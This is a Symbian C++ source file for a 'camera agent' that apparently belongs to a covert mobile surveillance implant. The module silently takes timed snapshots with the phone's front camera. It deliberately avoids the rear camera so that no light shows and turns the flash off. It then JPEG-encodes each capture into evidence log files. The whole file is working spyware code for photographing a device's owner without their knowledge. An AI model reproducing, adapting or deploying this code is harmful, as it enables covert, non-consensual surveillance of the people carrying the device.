/*
 * AgentCamera.cpp
 *
 *  Created on: 09/giu/2011
 *      Author: Giovanna
 */

#include "AgentCamera.h"
#include "LogFile.h"

#include <ICL\ImageData.h>
#include <ICL\ImageCodecData.h>


CAgentCamera::CAgentCamera() :
	CAbstractAgent(EAgent_Cam),iEngineState(EEngineNotReady)
	{
	// No implementation required
	}

CAgentCamera::~CAgentCamera()
	{
	delete iTimer;
	if(iEngineState!=EEngineNotReady)
		{
		iCamera->Release();
		iCamera->PowerOff();
		}
	delete iCamera;
	delete iEncoder;
	}

CAgentCamera* CAgentCamera::NewLC(const TDesC8& params)
	{
	CAgentCamera* self = new (ELeave) CAgentCamera();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCamera* CAgentCamera::NewL(const TDesC8& params)
	{
	CAgentCamera* self = CAgentCamera::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentCamera::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	TUint32 interval=0;               // time interval, in milliseconds, among two snapshots
	Mem::Copy( &interval, ptr, 4);
	ptr += 4;
	if(interval < 1000)
		{
		interval = 1000;
		}
	iSecondsInterv = (interval / 1000);		//time interval in seconds
		
	Mem::Copy(&iNumStep,ptr,4 );		// number of snapshots to take
	
	iTimer = CTimeOutTimer::NewL(*this);
	
	// we are only interested in front camera
	// unfortunately, we can't set rear camera light off during shooting... so we can't use rear camera
	iNumCamera = CCamera::CamerasAvailable();  //retrieve the number of available cameras (front and/or rear)
	if(iNumCamera < 2)
		{
		//there's no front camera
		iCameraIndex = -1;
		return;
		}
	iCameraIndex = 1;  //0=rear camera,1=front camera
	//check if we can silently take snapshots
	iCamera = CCamera::NewL(*this, iCameraIndex);
	iCamera->CameraInfo(iInfo);
	if(!(iInfo.iOptionsSupported & TCameraInfo::EImageCaptureSupported))
		{
		delete iCamera;
		iCamera=NULL;
		iCameraIndex=-1;
		return;
		}
	//retrieve supported image format		
	iFormat = ImageFormatMax();
	}

void CAgentCamera::StartAgentCmdL()
	{
	// if there's no front camera on device, or if it can't capture images
	if(iCameraIndex == -1)
		return;
	
	iPerformedStep=0;
	
	// set timer
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;
	iTimer->RcsAt(time);
	
	//prepare camera if another snapshot is not ongoing
	if(iEngineState==EEngineNotReady)
		{
		++iPerformedStep;
		iEngineState = EEngineReserving;
		iCamera->Reserve();  //at completion ReserveComplete() is called.
		}	
	}

void CAgentCamera::StopAgentCmdL()
	{
	iTimer->Cancel();
	if(iEngineState!=EEngineNotReady)
		{
		iCamera->Release();
		iCamera->PowerOff();
		}
	}

void CAgentCamera::TimerExpiredL(TAny* src)
	{
	++iPerformedStep;
	if(iPerformedStep < iNumStep)
		{
		// set timer again
		TTime time;
		time.HomeTime();
		time += iSecondsInterv;
		iTimer->RcsAt(time);
		}
	//prepare camera if another snapshot is not ongoing
	if(iEngineState==EEngineNotReady)
		{
		iEngineState = EEngineReserving;
		iCamera->Reserve();  //calls ReserveComplete() when complete
		}
	}

void CAgentCamera::ReserveComplete(TInt aError)
	{
	if(aError != KErrNone)
		{
		//we couldn't reserve camera, there's nothing more we can do
		iEngineState = EEngineNotReady;
		}
	else
		{
		// power on camera
		iEngineState = EEnginePowering;
		iCamera->PowerOn(); // calls PowerOnComplete when complete
		}
	}

void CAgentCamera::PowerOnComplete(TInt aError)
	{
	if(aError != KErrNone)
		{
		// Power on failed, release camera
		iCamera->Release();
		iEngineState = EEngineNotReady;
		}
	else
		{
		TRAPD(error,iCamera->PrepareImageCaptureL(iFormat,0)); //here, we simply select largest size (index 0)
		if(error)
			{
			iCamera->Release();
			iCamera->PowerOff();
			iEngineState = EEngineNotReady;
			}
		else
			{
			TRAPD(err,iCamera->SetFlashL(CCamera::EFlashNone));
			iEngineState = ESnappingPicture;
			iCamera->CaptureImage(); // calls ImageReady() when complete
			}
		}
	}

void CAgentCamera::ViewFinderFrameReady(CFbsBitmap &aFrame)
	{
	// no implementation required
	}

void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
	{
	//save log
	if(aError == KErrNone)
		{
		HBufC8* jpegImage = GetImageBufferL(aBitmap);
		CleanupStack::PushL(jpegImage);
		if (jpegImage->Length() > 0)
			{
			CLogFile* logFile = CLogFile::NewLC(iFs);
			logFile->CreateLogL(LOGTYPE_CAMERA);
			logFile->AppendLogL(*jpegImage);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
			}
		CleanupStack::PopAndDestroy(jpegImage);
		}
	
	//release camera
	iCamera->Release();
	iCamera->PowerOff();
	iEngineState = EEngineNotReady;
	}

/* 
 * Called asynchronously, when a buffer has been filled with the required number of video frames 
 * by CCamera::StartVideoCapture().
 */

void CAgentCamera::FrameBufferReady(MFrameBuffer *aFrameBuffer, TInt aError)
	{
	// not implementated; we only take still images.
	}

/*
 * Returns the highest color mode supported by HW
 */
CCamera::TFormat CAgentCamera::ImageFormatMax() 
    {
    if ( iInfo.iImageFormatsSupported & CCamera::EFormatFbsBitmapColor16M )
        {
        return CCamera::EFormatFbsBitmapColor16M;
        }
    else if ( iInfo.iImageFormatsSupported & CCamera::EFormatFbsBitmapColor64K)
        {
        return CCamera::EFormatFbsBitmapColor64K;
        }
    else
        {
        return CCamera::EFormatFbsBitmapColor4K;
        }
    }

/*
 * Returns a buffer with encoded jpeg image
 */
HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
	{
		if (aBitmap == NULL)
			return HBufC8::NewL(0); 

		CFrameImageData* frameImageData = CFrameImageData::NewL();
		CleanupStack::PushL(frameImageData);
		TJpegImageData* imageData = new (ELeave) TJpegImageData();
		imageData->iSampleScheme  = TJpegImageData::EColor444;
		imageData->iQualityFactor = 100; // = low, set 90 for normal or 100 for high 
		frameImageData->AppendImageData(imageData);
				
		HBufC8* imageBuf = NULL;
		CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
		CleanupStack::PushL(iencoder);
		TRequestStatus aStatus = KErrNone; 
		iencoder->Convert( &aStatus, *aBitmap, frameImageData );
		User::WaitForRequest( aStatus );
		CleanupStack::PopAndDestroy(iencoder);
				
		CleanupStack::PopAndDestroy(frameImageData);
		
		return imageBuf;
	}


    
